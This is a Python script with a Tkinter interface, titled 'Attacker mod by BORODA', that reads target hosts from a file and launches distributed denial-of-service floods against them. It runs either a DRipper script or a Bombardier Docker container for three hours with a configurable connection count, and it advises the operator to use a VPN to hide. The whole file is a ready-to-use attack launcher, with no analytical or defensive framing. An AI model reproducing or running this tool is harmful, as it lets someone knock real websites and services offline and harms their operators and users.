#!/usr/bin/python3
import os
import pathlib
import random
import subprocess
import tkinter as tk
import docker

import dns.resolver

os.environ["PYTHONUNBUFFERED"] = "1"


def is_ip4(s):
    pieces = s.split('.')
    if len(pieces) != 4: return False
    try:
        return all(0 <= int(p) < 256 for p in pieces)
    except ValueError:
        return False


def get_ip(host):
    if is_ip4(host):
        return host
    try:
        host = host.replace("http://", "").replace("https://", "")
        resolver = dns.resolver.Resolver()
        ips = list(resolver.resolve(host, 'A'))
        ip = random.choice(ips)
    except:
        ip = '255.255.255.255'
        return ip
    return ip.to_text()


processes = []
app = tk.Tk()
app.title("Attacker mod by BORODA")
app.geometry('300x400')

connectionCount = tk.StringVar(app)
label = tk.Label(app, text="Better use vpn before running this app")
label.pack()


def start():
    options_text = text.get(1.0, "end-1c")
    mode = radioSelector.get()
    for hostText in options_text.splitlines():
        if not hostText:
            continue
        address = []
        if hostText.count(":") > 1 or not hostText.startswith("http"):
            address = hostText.rsplit(":", 1)
        else:
            if hostText.startswith("http"):
                address.append(hostText)
        host = address[0]
        port = "443"
        if len(address) > 1:
            port = address[1]
        else:
            if host.startswith("http://"):
                port = "80"

        current = pathlib.Path(__file__).parent.resolve()
        os.chdir(current)
        if mode == 0:
            ip = get_ip(host)
            if ip != '255.255.255.255':
                run_ripper(ip, port)
        elif mode == 1:
            run_bombardier(host, port)


def stop():
    if radioSelector.get() == 0:
        for sub in processes:
            sub.kill()
    elif radioSelector.get() == 1:
        for sub in processes:
            sub.stop()
            sub.remove()
    exit(0)


def run_ripper(ip, port):
    cmd = f'python3 DRipper.py --quiet -s {ip} -t {connectionCount.get()} -p {port}'
    sub = subprocess.Popen(cmd, shell=True)
    processes.append(sub)


def run_bombardier(host, port):
    if host.startswith("http"):
        prefix = ""
    else:
        prefix = "https://"
        if port != "443":
            prefix = "http://"
    print(f"Starting bombardier to: {prefix}{host}:{port}")
    client = docker.from_env()
    container = client.containers.create("alpine/bombardier", f"-c {connectionCount.get()} -d 10800s -l {prefix}{host}:{port}")
    container.start()
    processes.append(container)


radioSelector = tk.IntVar()
radio1 = tk.Radiobutton(app, text="DRipper", variable=radioSelector, value=0)
radio1.pack(side=tk.TOP)
radio1.select()
radio2 = tk.Radiobutton(app, text="Bombardier (Docker)", variable=radioSelector, value=1)
radio2.pack(side=tk.TOP)

tk.Label(app, text="Connection count:").pack()
tk.Entry(app, width=8, textvariable=connectionCount).pack()
connectionCount.set("135")

btn = tk.Button(app, text='Start', bd='5', command=start)
btn.pack(side='top')

btn = tk.Button(app, text='Stop', bd='5', command=stop)
btn.pack(side='top')


hosts = open("hosts.txt", "r")
data = hosts.read()
hosts.close()

text = tk.Text(app, height=17, width=152)
text.insert(1.0, data)

text.pack()

app.mainloop()
